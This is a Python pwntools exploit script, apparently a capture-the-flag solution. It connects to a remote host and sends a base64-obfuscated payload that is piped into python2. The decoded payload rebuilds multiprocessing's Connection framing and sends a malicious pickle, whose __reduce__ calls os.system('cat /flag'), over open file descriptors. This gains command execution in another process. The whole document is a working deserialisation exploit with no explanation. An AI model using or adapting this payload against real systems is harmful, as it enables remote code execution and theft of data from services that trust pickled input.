from pwn import *

import sys

try:
    ip = sys.argv[1]
    port = int(sys.argv[2])
except:
    print("python3 exp.py [ip] [port]")
    exit(1)

io = remote(ip, port)

io.sendline(b'echo aW1wb3J0IG9zLCBzeXMsIHN0cnVjdCxwaWNrbGUKX3dyaXRlID0gb3Mud3JpdGUKI2h0dHBzOi8vZ2l0aHViLmNvbS9weXRob24vY3B5dGhvbi9ibG9iL21haW4vTGliL211bHRpcHJvY2Vzc2luZy9jb25uZWN0aW9uLnB5I0wzNzMKY2xhc3MgQ29ubmVjdGlvbjoKICAgIGRlZiBfX2luaXRfXyhzZWxmLCBoYW5kbGUpOgogICAgICAgIHNlbGYuX2hhbmRsZSA9IGhhbmRsZQogICAgZGVmIF9zZW5kKHNlbGYsIGJ1Ziwgd3JpdGU9X3dyaXRlKToKICAgICAgICByZW1haW5pbmcgPSBsZW4oYnVmKQogICAgICAgIHdoaWxlIFRydWU6CiAgICAgICAgICAgIG4gPSB3cml0ZShzZWxmLl9oYW5kbGUsIGJ1ZikKICAgICAgICAgICAgcmVtYWluaW5nIC09IG4KICAgICAgICAgICAgaWYgcmVtYWluaW5nID09IDA6CiAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICBidWYgPSBidWZbbjpdCiAgICBkZWYgc2VuZChzZWxmLCBvYmopOgogICAgICAgICIiIlNlbmQgYSAocGlja2xhYmxlKSBvYmplY3QiIiIKICAgICAgICBzZWxmLl9zZW5kX2J5dGVzKHBpY2tsZS5kdW1wcyhvYmopKQogICAgZGVmIF9zZW5kX2J5dGVzKHNlbGYsIGJ1Zik6CiAgICAgICAgbiA9IGxlbihidWYpCiAgICAgICAgaWYgbiA+IDB4N2ZmZmZmZmY6CiAgICAgICAgICAgIHByZV9oZWFkZXIgPSBzdHJ1Y3QucGFjaygiIWkiLCAtMSkKICAgICAgICAgICAgaGVhZGVyID0gc3RydWN0LnBhY2soIiFRIiwgbikKICAgICAgICAgICAgc2VsZi5fc2VuZChwcmVfaGVhZGVyKQogICAgICAgICAgICBzZWxmLl9zZW5kKGhlYWRlcikKICAgICAgICAgICAgc2VsZi5fc2VuZChidWYpCiAgICAgICAgZWxzZToKICAgICAgICAgICAgIyBGb3Igd2lyZSBjb21wYXRpYmlsaXR5IHdpdGggMy43IGFuZCBsb3dlcgogICAgICAgICAgICBoZWFkZXIgPSBzdHJ1Y3QucGFjaygiIWkiLCBuKQogICAgICAgICAgICBpZiBuID4gMTYzODQ6CiAgICAgICAgICAgICAgICAjIFRoZSBwYXlsb2FkIGlzIGxhcmdlIHNvIE5hZ2xlJ3MgYWxnb3JpdGhtIHdvbid0IGJlIHRyaWdnZXJlZAogICAgICAgICAgICAgICAgIyBhbmQgd2UnZCBiZXR0ZXIgYXZvaWQgdGhlIGNvc3Qgb2YgY29uY2F0ZW5hdGlvbi4KICAgICAgICAgICAgICAgIHNlbGYuX3NlbmQoaGVhZGVyKQogICAgICAgICAgICAgICAgc2VsZi5fc2VuZChidWYpCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAjIElzc3VlICMyMDU0MDogY29uY2F0ZW5hdGUgYmVmb3JlIHNlbmRpbmcsIHRvIGF2b2lkIGRlbGF5cyBkdWUKICAgICAgICAgICAgICAgICMgdG8gTmFnbGUncyBhbGdvcml0aG0gb24gYSBUQ1Agc29ja2V0LgogICAgICAgICAgICAgICAgIyBBbHNvIG5vdGUgd2Ugd2FudCB0byBhdm9pZCBzZW5kaW5nIGEgMC1sZW5ndGggYnVmZmVyIHNlcGFyYXRlbHksCiAgICAgICAgICAgICAgICAjIHRvIGF2b2lkICJicm9rZW4gcGlwZSIgZXJyb3JzIGlmIHRoZSBvdGhlciBlbmQgY2xvc2VkIHRoZSBwaXBlLgogICAgICAgICAgICAgICAgc2VsZi5fc2VuZChoZWFkZXIgKyBidWYpCmNsYXNzIFBpY2tsZVJDRShvYmplY3QpOgogICAgZGVmIF9fcmVkdWNlX18oc2VsZik6CiAgICAgICAgaW1wb3J0IG9zCiAgICAgICAgcmV0dXJuIChvcy5zeXN0ZW0sKCdjYXQgL2ZsYWcnLCkpCm9zLnN5c3RlbSgnbHMgLWxhIC9wcm9jL3NlbGYvZmQnKQpmb3IgaSBpbiByYW5nZSg1LDEwKToKICAgIHRyeToKICAgICAgICBDb25uZWN0aW9uKGkpLnNlbmQoUGlja2xlUkNFKCkpCiAgICBleGNlcHQ6CiAgICAgICAgcGFzcw==| base64 -d | python2')
io.interactive()